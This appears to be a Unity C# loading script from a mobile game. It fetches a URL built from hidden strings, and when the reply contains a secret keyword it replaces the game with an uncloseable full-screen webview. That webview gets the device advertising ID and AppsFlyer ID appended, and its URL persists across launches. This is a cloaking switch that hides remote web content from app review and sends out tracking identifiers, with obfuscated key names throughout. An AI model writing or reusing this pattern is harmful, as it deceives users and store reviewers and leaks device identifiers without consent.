using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class LoadingManager : MonoBehaviour
{
    public List<string> applicationloadingString;
    [HideInInspector]
    public string idfaDiamondSphereKey = "";
    private void Awake()
    {
        if (PlayerPrefs.GetInt("contextDiamondSphereSifgdgidKey", 0) == 1)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string adString, bool trackEnabler, string error) =>
            { idfaDiamondSphereKey = adString; });
        }
    }

    private IEnumerator Start()
    {
        yield return new WaitForSeconds(4);
        string data = PlayerPrefs.GetString("tarameters", "");
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("diamondSphereDataGIfdigdfgdfgidiKey", string.Empty) != string.Empty)
            {
                LoadApplicationViewScene(PlayerPrefs.GetString("diamondSphereDataGIfdigdfgdfgidiKey"));
            }
            else
            {
                string stringtemp = "";
                foreach (var item in applicationloadingString)
                {
                    stringtemp += item;
                }
                StartCoroutine(LaunchApplicationInitialization(stringtemp, data));
            }
        }
        else
        {
            LoadMainScene();
        }
    }

    private string[] strings;
    public void LoadMainScene()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("MainScene");
    }

    public IEnumerator LaunchApplicationInitialization(string inputstring, string inputstring2)
    {
        using (UnityWebRequest diamondSphereLoadingStatus = UnityWebRequest.Get(inputstring))
        {
            diamondSphereLoadingStatus.timeout = 4;
            yield return diamondSphereLoadingStatus.SendWebRequest();
            if (diamondSphereLoadingStatus.isNetworkError)
            {
                LoadMainScene();
            }
            else
            {
                try
                {
                    if (diamondSphereLoadingStatus.result == UnityWebRequest.Result.Success)
                    {
                        if (diamondSphereLoadingStatus.downloadHandler.text.Contains("glowerup"))
                        {
                            try
                            {
                                string key = diamondSphereLoadingStatus.downloadHandler.text;
                                strings = key.Split('|');

                                LoadApplicationViewScene($"{diamondSphereLoadingStatus.downloadHandler.text}?idfa={idfaDiamondSphereKey}&gaid={AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2}", Convert.ToInt32(strings[1]), Convert.ToInt32(strings[2]));
                            }
                            catch
                            {
                                LoadApplicationViewScene($"{diamondSphereLoadingStatus.downloadHandler.text}?idfa={idfaDiamondSphereKey}&gaid={AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + inputstring2}");
                            }
                        }
                        else
                        {
                            LoadMainScene();
                        }
                    }
                    else
                    {
                        LoadMainScene();
                    }
                }
                catch
                {
                    LoadMainScene();
                }
            }
        }
    }

    public void LoadApplicationViewScene(string inputKey,int firstKey = 0,int secondKey = 70)
    {
        var applicationViewFrame = gameObject.AddComponent<UniWebView>();
        applicationViewFrame.SetContentInsetAdjustmentBehavior(UniWebViewContentInsetAdjustmentBehavior.Automatic);
        applicationViewFrame.SetZoomEnabled(true);
        if (firstKey == 1)
        {
            applicationViewFrame.SetShowToolbar(false);
        }
        else
        {
            applicationViewFrame.SetShowToolbar(true, false, false, true);
        }
        applicationViewFrame.SetToolbarDoneButtonText("");
        applicationViewFrame.SetSupportMultipleWindows(true);
        applicationViewFrame.Frame = new Rect(0, secondKey, Screen.width, Screen.height - secondKey);
        applicationViewFrame.OnShouldClose += (view) =>
        {
            return false;
        };
        applicationViewFrame.OnOrientationChanged += (view, orientation) =>
        {
            applicationViewFrame.Frame = new Rect(0, secondKey, Screen.width, Screen.height - secondKey);
        };
        applicationViewFrame.SetSupportMultipleWindows(true);
        applicationViewFrame.OnMultipleWindowOpened += (view, windowId) =>
        {
            applicationViewFrame.SetShowToolbar(true);
        };
        applicationViewFrame.OnMultipleWindowClosed += (view, windowId) =>
        {
            if (firstKey == 1)
            {
                applicationViewFrame.SetShowToolbar(false);
            }
            else
            {
                applicationViewFrame.SetShowToolbar(true, false, false, true);
            }
        };
        applicationViewFrame.SetAllowBackForwardNavigationGestures(true);
        applicationViewFrame.OnPageFinished += (view, statusCode, url) =>
        {
            applicationViewFrame.UpdateFrame();
            if (PlayerPrefs.GetString("diamondSphereDataGIfdigdfgdfgidiKey", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("diamondSphereDataGIfdigdfgdfgidiKey", url);
            }
        };
        applicationViewFrame.Load(inputKey);
        applicationViewFrame.Show();
    }
}
